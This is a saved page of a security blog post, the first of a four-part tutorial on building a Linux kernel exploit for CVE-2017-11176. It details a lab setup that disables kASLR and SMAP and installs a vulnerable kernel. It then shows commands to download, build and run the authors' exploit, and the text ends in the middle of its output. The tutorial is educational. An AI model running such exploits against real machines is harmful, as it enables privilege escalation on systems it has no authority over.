<!DOCTYPE html>
<!-- saved from url=(0073)https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html -->
<html lang="en" class="fontawesome-i2svg-active fontawesome-i2svg-complete"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>Lexfo's security blog - CVE-2017-11176: A step-by-step Linux Kernel exploitation (part 1/4)</title><meta content="width=device-width, initial-scale=1, shrink-to-fit=no" name="viewport"><style type="text/css">svg:not(:root).svg-inline--fa{overflow:visible}.svg-inline--fa{display:inline-block;font-size:inherit;height:1em;overflow:visible;vertical-align:-.125em}.svg-inline--fa.fa-lg{vertical-align:-.225em}.svg-inline--fa.fa-w-1{width:.0625em}.svg-inline--fa.fa-w-2{width:.125em}.svg-inline--fa.fa-w-3{width:.1875em}.svg-inline--fa.fa-w-4{width:.25em}.svg-inline--fa.fa-w-5{width:.3125em}.svg-inline--fa.fa-w-6{width:.375em}.svg-inline--fa.fa-w-7{width:.4375em}.svg-inline--fa.fa-w-8{width:.5em}.svg-inline--fa.fa-w-9{width:.5625em}.svg-inline--fa.fa-w-10{width:.625em}.svg-inline--fa.fa-w-11{width:.6875em}.svg-inline--fa.fa-w-12{width:.75em}.svg-inline--fa.fa-w-13{width:.8125em}.svg-inline--fa.fa-w-14{width:.875em}.svg-inline--fa.fa-w-15{width:.9375em}.svg-inline--fa.fa-w-16{width:1em}.svg-inline--fa.fa-w-17{width:1.0625em}.svg-inline--fa.fa-w-18{width:1.125em}.svg-inline--fa.fa-w-19{width:1.1875em}.svg-inline--fa.fa-w-20{width:1.25em}.svg-inline--fa.fa-pull-left{margin-right:.3em;width:auto}.svg-inline--fa.fa-pull-right{margin-left:.3em;width:auto}.svg-inline--fa.fa-border{height:1.5em}.svg-inline--fa.fa-li{width:2em}.svg-inline--fa.fa-fw{width:1.25em}.fa-layers svg.svg-inline--fa{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0}.fa-layers{display:inline-block;height:1em;position:relative;text-align:center;vertical-align:-.125em;width:1em}.fa-layers svg.svg-inline--fa{-webkit-transform-origin:center center;transform-origin:center center}.fa-layers-counter,.fa-layers-text{display:inline-block;position:absolute;text-align:center}.fa-layers-text{left:50%;top:50%;-webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%);-webkit-transform-origin:center center;transform-origin:center center}.fa-layers-counter{background-color:#ff253a;border-radius:1em;-webkit-box-sizing:border-box;box-sizing:border-box;color:#fff;height:1.5em;line-height:1;max-width:5em;min-width:1.5em;overflow:hidden;padding:.25em;right:0;text-overflow:ellipsis;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top right;transform-origin:top right}.fa-layers-bottom-right{bottom:0;right:0;top:auto;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:bottom right;transform-origin:bottom right}.fa-layers-bottom-left{bottom:0;left:0;right:auto;top:auto;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:bottom left;transform-origin:bottom left}.fa-layers-top-right{right:0;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top right;transform-origin:top right}.fa-layers-top-left{left:0;right:auto;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top left;transform-origin:top left}.fa-lg{font-size:1.33333em;line-height:.75em;vertical-align:-.0667em}.fa-xs{font-size:.75em}.fa-sm{font-size:.875em}.fa-1x{font-size:1em}.fa-2x{font-size:2em}.fa-3x{font-size:3em}.fa-4x{font-size:4em}.fa-5x{font-size:5em}.fa-6x{font-size:6em}.fa-7x{font-size:7em}.fa-8x{font-size:8em}.fa-9x{font-size:9em}.fa-10x{font-size:10em}.fa-fw{text-align:center;width:1.25em}.fa-ul{list-style-type:none;margin-left:2.5em;padding-left:0}.fa-ul>li{position:relative}.fa-li{left:-2em;position:absolute;text-align:center;width:2em;line-height:inherit}.fa-border{border:solid .08em #eee;border-radius:.1em;padding:.2em .25em .15em}.fa-pull-left{float:left}.fa-pull-right{float:right}.fa.fa-pull-left,.fab.fa-pull-left,.fal.fa-pull-left,.far.fa-pull-left,.fas.fa-pull-left{margin-right:.3em}.fa.fa-pull-right,.fab.fa-pull-right,.fal.fa-pull-right,.far.fa-pull-right,.fas.fa-pull-right{margin-left:.3em}.fa-spin{-webkit-animation:fa-spin 2s infinite linear;animation:fa-spin 2s infinite linear}.fa-pulse{-webkit-animation:fa-spin 1s infinite steps(8);animation:fa-spin 1s infinite steps(8)}@-webkit-keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}.fa-rotate-90{-webkit-transform:rotate(90deg);transform:rotate(90deg)}.fa-rotate-180{-webkit-transform:rotate(180deg);transform:rotate(180deg)}.fa-rotate-270{-webkit-transform:rotate(270deg);transform:rotate(270deg)}.fa-flip-horizontal{-webkit-transform:scale(-1,1);transform:scale(-1,1)}.fa-flip-vertical{-webkit-transform:scale(1,-1);transform:scale(1,-1)}.fa-flip-horizontal.fa-flip-vertical{-webkit-transform:scale(-1,-1);transform:scale(-1,-1)}:root .fa-flip-horizontal,:root .fa-flip-vertical,:root .fa-rotate-180,:root .fa-rotate-270,:root .fa-rotate-90{-webkit-filter:none;filter:none}.fa-stack{display:inline-block;height:2em;position:relative;width:2em}.fa-stack-1x,.fa-stack-2x{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0}.svg-inline--fa.fa-stack-1x{height:1em;width:1em}.svg-inline--fa.fa-stack-2x{height:2em;width:2em}.fa-inverse{color:#fff}.sr-only{border:0;clip:rect(0,0,0,0);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px}.sr-only-focusable:active,.sr-only-focusable:focus{clip:auto;height:auto;margin:0;overflow:visible;position:static;width:auto}</style><link href="https://blog.lexfo.fr/feeds/all.atom.xml" rel="alternate" title="Lexfo&#39;s security blog Full Atom Feed" type="application/atom+xml"><link href="https://blog.lexfo.fr/feeds/all.rss.xml" rel="alternate" title="Lexfo&#39;s security blog Full RSS Feed" type="application/rss+xml"><link href="https://blog.lexfo.fr/feeds/%7Bslug%7D.atom.xml" rel="alternate" title="Lexfo&#39;s security blog Categories Atom Feed" type="application/atom+xml"><link href="https://blog.lexfo.fr/feeds/%7Bslug%7D.rss.xml" rel="alternate" title="Lexfo&#39;s security blog Categories RSS Feed" type="application/rss+xml"><link href="https://blog.lexfo.fr/theme/images/favicon.ico" rel="icon" type="image/x-icon"><link href="./2018 - CVE-2017-11176  A step-by-step Linux Kernel exploitation part  1_files/packed.css" rel="stylesheet" type="text/css"></head><body><header class="blog-header py-3 text-center" id="logo"><h1><a href="https://blog.lexfo.fr/"><img src="./2018 - CVE-2017-11176  A step-by-step Linux Kernel exploitation part  1_files/lexfo.png" title="Lexfo&#39;s security blog"></a></h1></header><nav class="navbar navbar-expand-md navbar-dark mb-4" style="background-color: rgb(179,32,39);"><div class="container"><button aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" class="navbar-toggler" data-target="#navbarSupportedContent" data-toggle="collapse" type="button"><span class="navbar-toggler-icon"></span></button><div class="collapse navbar-collapse" id="navbarSupportedContent"><ul class="navbar-nav position-absolute-left"><li class="nav-item"><a class="nav-link text-light" href="https://lexfo.fr/">Back to the main site</a></li></ul><ul class="navbar-nav ml-auto mr-auto"><li class="nav-item"><a class="nav-link text-light" href="https://blog.lexfo.fr/">Home</a></li><li class="nav-item"><a class="nav-link text-light" href="https://blog.lexfo.fr/categories.html">Categories</a></li><li class="nav-item"><a class="nav-link text-light" href="https://blog.lexfo.fr/tags.html">Tags</a></li><li class="nav-item"><a class="nav-link text-light" href="https://blog.lexfo.fr/archives.html">Archives</a></li></ul></div></div></nav><main class="container" role="main"><div class="row"><article class="col-10 offset-1 blog-main"><div class="p-3 blog-post rounded"><h1 class="blog-post-title mb-1">CVE-2017-11176: A step-by-step Linux Kernel exploitation (part 1/4)</h1><div class="blog-post-meta mb-4"><p><span class="mr-3"><strong>Tue 02 October 2018</strong> by <strong>Nicolas FABRETTI</strong> in <strong><a href="https://blog.lexfo.fr/category/vulnerability.html">Vulnerability</a>.</strong></span></p><p><span><a "="" class="mr-2" href="https://blog.lexfo.fr/tag/linux.html"><svg class="svg-inline--fa fa-tag fa-w-16" aria-hidden="true" data-prefix="fas" data-icon="tag" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"></path></svg><!-- <span class="fas fa-tag"></span> --> Linux</a> <a "="" class="mr-2" href="https://blog.lexfo.fr/tag/kernel.html"><svg class="svg-inline--fa fa-tag fa-w-16" aria-hidden="true" data-prefix="fas" data-icon="tag" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"></path></svg><!-- <span class="fas fa-tag"></span> --> Kernel</a> <a "="" class="mr-2" href="https://blog.lexfo.fr/tag/exploit.html"><svg class="svg-inline--fa fa-tag fa-w-16" aria-hidden="true" data-prefix="fas" data-icon="tag" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"></path></svg><!-- <span class="fas fa-tag"></span> --> Exploit</a> <a "="" class="mr-2" href="https://blog.lexfo.fr/tag/vulnerability.html"><svg class="svg-inline--fa fa-tag fa-w-16" aria-hidden="true" data-prefix="fas" data-icon="tag" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"></path></svg><!-- <span class="fas fa-tag"></span> --> Vulnerability</a> <a "="" class="mr-2" href="https://blog.lexfo.fr/tag/step-by-step.html"><svg class="svg-inline--fa fa-tag fa-w-16" aria-hidden="true" data-prefix="fas" data-icon="tag" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"></path></svg><!-- <span class="fas fa-tag"></span> --> Step-by-step</a></span></p><div class="share" id="post-share-links"><div class="share-twitter"><a href="https://twitter.com/intent/tweet?text=CVE-2017-11176%3A%20A%20step-by-step%20Linux%20Kernel%20exploitation%20%28part%201/4%29&amp;url=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html" rel="nofollow noopener" target="_blank"><span><svg aria-hidden="true" class="svg-inline--fa fa-twitter fa-w-16" data-prefix="fab" data-icon="twitter" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg><!-- <i aria-hidden="true" class="fab fa-twitter"></i> -->Tweet</span></a></div><div class="share-facebook"><a href="http://www.facebook.com/sharer/sharer.php?u=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html" rel="nofollow noopener" target="_blank"><span><svg aria-hidden="true" class="svg-inline--fa fa-facebook fa-w-14" data-prefix="fab" data-icon="facebook" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M448 56.7v398.5c0 13.7-11.1 24.7-24.7 24.7H309.1V306.5h58.2l8.7-67.6h-67v-43.2c0-19.6 5.4-32.9 33.5-32.9h35.8v-60.5c-6.2-.8-27.4-2.7-52.2-2.7-51.6 0-87 31.5-87 89.4v49.9h-58.4v67.6h58.4V480H24.7C11.1 480 0 468.9 0 455.3V56.7C0 43.1 11.1 32 24.7 32h398.5c13.7 0 24.8 11.1 24.8 24.7z"></path></svg><!-- <i aria-hidden="true" class="fab fa-facebook"></i> -->Share</span></a></div><div class="share-linkedin"><a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html&amp;title=CVE-2017-11176%3A%20A%20step-by-step%20Linux%20Kernel%20exploitation%20%28part%201/4%29&amp;summary=The%20first%20article%20covers%20an%20in-depth%20CVE/bug%20analysis%2C%20designs%20an%20attack%20scenario%20and%20starts%20implementing%20a%20PoC%20in%20ring-0%20with%20SystemTap.%20The%20core%20concept%20section%20focuses%20on%20file/socket%20related%20data%20structures%2C%20netlink%20and%20refcounters.&amp;source=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html" rel="nofollow noopener" target="_blank"><span><svg aria-hidden="true" class="svg-inline--fa fa-linkedin fa-w-14" data-prefix="fab" data-icon="linkedin" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg><!-- <i aria-hidden="true" class="fab fa-linkedin"></i> -->Share</span></a></div><div class="share-email"><a href="mailto:?subject=CVE-2017-11176%3A%20A%20step-by-step%20Linux%20Kernel%20exploitation%20%28part%201/4%29&amp;body=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html" rel="nofollow noopener" target="_blank"><span><svg aria-hidden="true" class="svg-inline--fa fa-envelope fa-w-16" data-prefix="far" data-icon="envelope" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M464 64H48C21.49 64 0 85.49 0 112v288c0 26.51 21.49 48 48 48h416c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm0 48v40.805c-22.422 18.259-58.168 46.651-134.587 106.49-16.841 13.247-50.201 45.072-73.413 44.701-23.208.375-56.579-31.459-73.413-44.701C106.18 199.465 70.425 171.067 48 152.805V112h416zM48 400V214.398c22.914 18.251 55.409 43.862 104.938 82.646 21.857 17.205 60.134 55.186 103.062 54.955 42.717.231 80.509-37.199 103.053-54.947 49.528-38.783 82.032-64.401 104.947-82.653V400H48z"></path></svg><!-- <i aria-hidden="true" class="far fa-envelope"></i> -->Share</span></a></div></div></div><div class="blog-post-content"><h1 id="introduction">Introduction</h1><p>This series covers a step-by-step walkthrough to develop a Linux kernel exploit from a CVE description. It starts with the patch analysis to understand the bug and trigger it from kernel land (<a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html">part 1</a>), then it gradually builds a working proof-of-concept code (<a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html">part 2</a>). The PoC is then turned into an arbitrary call primitive (<a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html">part 3</a>) which is finally used to execute arbitrary code in ring-0 (<a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html">part 4</a>).</p><p>The targeted audience is the Linux kernel newcomers (nothing too fancy for the veterans). Since most kernel exploit articles imply that the reader is already familiar with the kernel code, we will try to fill the gap by exposing core data structure and important code paths. In the end, <strong>every single line of the exploit should be understood, as well as their impact on the kernel</strong>.</p><p>While it is impossible to cover everything in a single article, we will try to <em>unroll</em> every kernel path needed to develop the exploit. Think of it as a guided Linux kernel tour supported by a practical example. Exploit writing is actually a good way to understand the Linux kernel. In addition, we will show some debugging techniques, tools, common pitfalls and how to fix them.</p><p>The CVE developed here is <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11176">CVE-2017-11176</a>, aka "mq_notify: double sock_put()". Most distributions patched it during the mid 2017. At the time of writing, there is no known public exploit.</p><p>The kernel code exposed here matches a specific version (v2.6.32.x), nevertheless the bug also affects kernels up to 4.11.9. One might think that this version is too old, yet it is still actually used in a lot of places and some paths might be easier to understand. It shouldn't be too hard to find the equivalent paths on a more recent kernel.</p><p>The exploit built here is not targetless. Hence, some modifications are required to run it on another target (structure offsets/layout, gadgets, function addresses...). Do not try to run the exploit <em>as is</em>, this <strong>will</strong> just crash your system! You can find the final exploit <a href="https://github.com/lexfo/cve-2017-11176/blob/master/cve-2017-11176.c">here</a>.</p><p>It is recommended grabbing the <a href="https://www.kernel.org/">source code</a> of a vulnerable kernel and try to follow the code on the go (or even better, implement the exploit). Fire up your favorite code crawling tool and let's start!</p><p><strong>Warning</strong>: Please do not get scared by the size of this series, there are tons of code. Anyway, if you really want to get into kernel hacking, you must be ready to read a lot of codes and documentation. Just take your time.</p><p><strong>Note</strong>: <em>we do not deserve any credit for this CVE discovery, it is basically a 1-day implementation.</em></p><hr><h1 id="table-of-contents">Table of Contents</h1><ul><li><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html#recommended-reading">Recommended Reading</a></li><li><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html#lab-setup">Lab Setup</a></li><li><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html#core-concepts">Core Concepts</a></li><li><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html#public-information">Public Information</a></li><li><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html#understanding-the-bug">Understanding the Bug</a></li><li><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html#reaching-the-retry-logic">Reaching the Retry Logic</a></li><li><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html#forcing-the-trigger">Forcing the Trigger</a></li><li><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html#conclusion">Conclusion</a></li></ul><hr><h1 id="recommended-reading">Recommended Reading</h1><p>This article only covers a small subset of the whole kernel. We recommend you to read those books (they are great!):</p><ul><li>Understanding the Linux Kernel (D. P. Bovet, M. Cesati)</li><li>Understanding Linux Network Internals (C. Benvenuti)</li><li>A guide to Kernel Exploitation: Attacking the Core (E. Perla, M. Oldani)</li><li>Linux Device Drivers (J. Corbet, A. Rubini, G. Kroah-Hartman)</li></ul><hr><h1 id="lab-setup">Lab Setup</h1><p><strong>UPDATE</strong>: Thanks to readers feedbacks, this section has been updated (2018-10-22).</p><p>The code exposed here comes from a specific target (2.6.32.x). However, you can try to implement the exploit on the following target. There might be slight variations in the code that shouldn't be blocking.</p><p><a href="https://cdimage.debian.org/mirror/cdimage/archive/8.6.0-live/amd64/iso-hybrid/debian-live-8.6.0-amd64-standard.iso">Debian 8.6.0 (amd64) ISO</a></p><p>The previous ISO runs a <strong>3.16.36</strong> kernel. We only confirmed that the bug is reachable and makes the kernel crash. Most of the changes will appear during the last stages of exploitation (cf. part 3 and 4).</p><p>While the bug is (mostly) exploitable in various configurations/architecture, the only requirements needed to exploit it the same way we do are:</p><ul><li>Kernel version <strong>must</strong> be lower than 4.11.9 (we recommend &lt; 4.x)</li><li>It <strong>must</strong> run on "amd64" (x86-64) architecture</li><li>You have root access for debugging purpose</li><li>The kernel uses the SLAB allocator</li><li>SMEP is enabled</li><li>kASLR and SMAP are disabled</li><li>Memory: &gt;=512MB</li><li>Any number of CPU. One is okay, you will understand why soon enough.</li></ul><p><strong>WARNING</strong>: Due to code variation in the suggested target, it is recommended to set the number of CPU to one. Otherwise, reallocation may need additional steps (cf. part 3).</p><p>The "default" configuration on the previous ISO satisfies all of those requirements. If you want to develop the exploit on another target, please see the next section.</p><p>Do not worry if you don't know what are SLAB/SMEP/SMAP, this will be covered in <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html">part 3</a> and <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html">part 4</a>.</p><p><strong>WARNING</strong>: To ease debugging, you must run the target with a virtualization software. However, we discourage using <em>virtualbox</em> as it didn't support SMEP (not sure if it does right now). You can use the free version of <em>vmware</em> for instance or any other virtualization tool as long as it supports SMEP (we will bypass it).</p><p>Once the system has been <strong>installed</strong> (don't develop on a LiveCD), we need to check that the system configuration is as expected.</p><h2 id="checking-slabsmepsmapkaslr-status">Checking SLAB/SMEP/SMAP/KASLR Status</h2><p>In order to know if SMEP is enabled or not, run the following command. The "smep" string MUST be present:</p><div class="highlight"><pre><span></span><code>$ grep <span class="s2">"smep"</span> /proc/cpuinfo
flags   : <span class="o">[</span>...<span class="o">]</span> smep bmi2 invpcid
                ^--- this one
</code></pre></div><p>If not, check that <strong>cat /proc/cmdline</strong> does NOT have the <strong>nosmep</strong> string. If it does, you will need to edit the <strong>/etc/default/grub</strong> file and modify the following lines:</p><div class="highlight"><pre><span></span><code># /etc/default/grub
GRUB_CMDLINE_LINUX_DEFAULT="quiet"              // must NOT have "nosmep"
GRUB_CMDLINE_LINUX="initrd=/install/initrd.gz"  // must NOT have "nosmep"
</code></pre></div><p>Then run <strong>update-grub</strong> and reboot your system. If this is still disabled afterward (check <em>/proc/cpuinfo</em>), then use another virtualization tool.</p><p>For SMAP, you will need to do the exact opposite. First, grep for "smap" in <em>/proc/cpuinfo</em>. If it does not appear, everything is okay. Otherwise, add "nosmap" in your grub configuration file (then <em>update-grub</em> and reboot).</p><p>The exploit developed here we will use "hardcoded" addresses. For this reason, kASLR must be disabled. This is the equivalent of <em>ASLR</em> (<a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization">Address Space Layout Randomization</a>) but for the kernel. In order to disable it, you can add the <strong>nokaslr</strong> option in the cmdline (just like <em>nosmap</em>). In the end, the grub cmdline should be something like:</p><div class="highlight"><pre><span></span><code>GRUB_CMDLINE_LINUX_DEFAULT="quiet nokaslr nosmap"
GRUB_CMDLINE_LINUX="initrd=/install/initrd.gz"
</code></pre></div><p>Finally, your target must use the <em>SLAB</em> allocator. You can validate the kernel is using it with:</p><div class="highlight"><pre><span></span><code>$ grep <span class="s2">"CONFIG_SL.B="</span> /boot/config-<span class="k">$(</span>uname -r<span class="k">)</span>
<span class="nv">CONFIG_SLAB</span><span class="o">=</span>y
</code></pre></div><p>It must be <strong>CONFIG_SLAB=y</strong>. Debian uses SLAB by default while Ubuntu uses SLUB by default. If not, then you will need to <strong>recompile the kernel</strong>. Please read your distribution documentation.</p><p>Again, the suggested ISO satisfies all those requirements, so you only need to check that everything is okay.</p><h2 id="installing-systemtap">Installing SystemTap</h2><p>As mentioned before, the ISO runs a <em>v3.16.36</em> (<em>uname -v</em>) kernel which is vulnerable to the bug (patched in <a href="https://lwn.net/Articles/732094/">v3.16.47</a>).</p><p><strong>WARNING</strong>: Do NOT follow the systemtap installation procedure as it might update the kernel!</p><p>Because of this, we will need to grab the <em>.deb</em> package for our specific version and install them manually. We will need:</p><ul><li>linux-image-3.16.0-4-amd64_3.16.36-1+deb8u1_amd64.deb</li><li>linux-image-3.16.0-4-amd64-dbg_3.16.36-1+deb8u1_amd64.deb</li><li>linux-headers-3.16.0-4-amd64_3.16.36-1+deb8u1_amd64.deb</li></ul><p>You can download them from <a href="https://snapshot.debian.org/package/linux/3.16.36-1%2Bdeb8u1/">this link</a>, or type:</p><div class="highlight"><pre><span></span><code><span class="c1"># wget https://snapshot.debian.org/archive/debian-security/20160904T172241Z/pool/updates/main/l/linux/linux-image-3.16.0-4-amd64_3.16.36-1%2Bdeb8u1_amd64.deb</span>
<span class="c1"># wget https://snapshot.debian.org/archive/debian-security/20160904T172241Z/pool/updates/main/l/linux/linux-image-3.16.0-4-amd64-dbg_3.16.36-1%2Bdeb8u1_amd64.deb</span>
<span class="c1"># wget https://snapshot.debian.org/archive/debian-security/20160904T172241Z/pool/updates/main/l/linux/linux-headers-3.16.0-4-amd64_3.16.36-1%2Bdeb8u1_amd64.deb</span>
</code></pre></div><p>Then, install them with:</p><div class="highlight"><pre><span></span><code># dpkg -i linux-image-3.16.0-4-amd64_3.16.36-1+deb8u1_amd64.deb
# dpkg -i linux-image-3.16.0-4-amd64-dbg_3.16.36-1+deb8u1_amd64.deb
# dpkg -i linux-headers-3.16.0-4-amd64_3.16.36-1+deb8u1_amd64.deb
</code></pre></div><p>Once you're done, reboot the system and then download system tap with:</p><div class="highlight"><pre><span></span><code><span class="c1"># apt install systemtap</span>
</code></pre></div><p>And finally, check that everything is fine:</p><div class="highlight"><pre><span></span><code># stap -v -e 'probe vfs.read {printf("read performed\n"); exit()}'
stap: Symbol `SSL_ImplementedCiphers' has different size in shared object, consider re-linking
Pass 1: parsed user script and 106 library script(s) using 87832virt/32844res/5328shr/28100data kb, in 100usr/10sys/118real ms.
Pass 2: analyzed script: 1 probe(s), 1 function(s), 3 embed(s), 0 global(s) using 202656virt/149172res/6864shr/142924data kb, in 1180usr/730sys/3789real ms.
Pass 3: translated to C into "/tmp/stapWdpIWC/stap_1390f4a5f16155a0227289d1fa3d97a4_1464_src.c" using 202656virt/149364res/7056shr/142924data kb, in 0usr/20sys/23real ms.
Pass 4: compiled C into "stap_1390f4a5f16155a0227289d1fa3d97a4_1464.ko" in 6310usr/890sys/13392real ms.
Pass 5: starting run.
read performed                                      // &lt;--------------
Pass 5: run completed in 10usr/20sys/309real ms.
</code></pre></div><h2 id="last-minute-checks">Last Minute Checks</h2><p><strong>Updated (2018-10-22)</strong></p><p>In addition to system tap, the target kernel will be used to compile and run the exploit, so run this:</p><div class="highlight"><pre><span></span><code><span class="c1"># apt install binutils gcc</span>
</code></pre></div><p>Now, download the <a href="https://github.com/lexfo/cve-2017-11176/blob/master/cve-2017-11176.c">exploit</a> with:</p><div class="highlight"><pre><span></span><code>$ wget https://raw.githubusercontent.com/lexfo/cve-2017-11176/master/cve-2017-11176.c
</code></pre></div><p><strong>Due to code differences between the suggested and the article targets, the "used-after-freed" object here lies in the "kmalloc-2048" cache (instead of kmalloc-1024).</strong> That is, change the following lines in the exploit:</p><div class="highlight"><pre><span></span><code><span class="cp">#define KMALLOC_TARGET 2048 </span><span class="c1">// instead of 1024</span>
</code></pre></div><p>This is the kind of problems that arises with non-targetless exploit. You will understand this change by reading part 3. Now, build and run the exploit:</p><div class="highlight"><pre><span></span><code>$ gcc -fpic -O0 -std<span class="o">=</span>c99 -Wall -pthread cve-2017-11176.c -o exploit
$ ./exploit
<span class="o">[</span> <span class="o">]</span> -<span class="o">={</span> CVE-2017-11176 Exploit <span class="o">}=</span>-
<span class="o">[</span>+<span class="o">]</span> successfully migrated to CPU#0
<span class="o">[</span>+<span class="o">]</span> userland structures allocated:
<span class="o">[</span>+<span class="o">]</span> <span class="nv">g_uland_wq_elt</span> <span class="o">=</span> 0x120001000
<span class="o">[</span>+<span class="o">]</span> <span class="nv">g_fake_stack</span>   <span class="o">=</span> 0x20001000
<span class="o">[</span>+<span class="o">]</span> ROP-chain ready
